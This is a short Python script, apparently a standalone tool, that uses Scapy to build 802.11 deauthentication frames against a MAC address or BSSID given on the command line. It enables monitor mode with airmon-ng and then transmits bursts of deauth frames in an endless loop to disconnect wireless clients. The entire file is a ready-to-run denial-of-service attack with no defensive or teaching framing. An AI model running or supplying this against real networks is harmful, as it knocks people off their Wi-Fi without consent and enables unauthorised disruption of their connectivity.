from scapy.all import *
import time
import os
import sys

def send_deauth(target_mac, iface="wlan0mon"):
    """Sends continuous deauth packets to forcefully disconnect clients."""
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
    while True:
        sendp(packet, iface=iface, count=100, inter=0.1, verbose=True)
        time.sleep(2)  # Keep sending packets

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 deauth.py <BSSID>")
        sys.exit(1)

    target_mac = sys.argv[1]

    print(f"[*] Starting Deauth Attack on {target_mac}...")
    os.system("sudo airmon-ng start wlan0")
    
    send_deauth(target_mac)
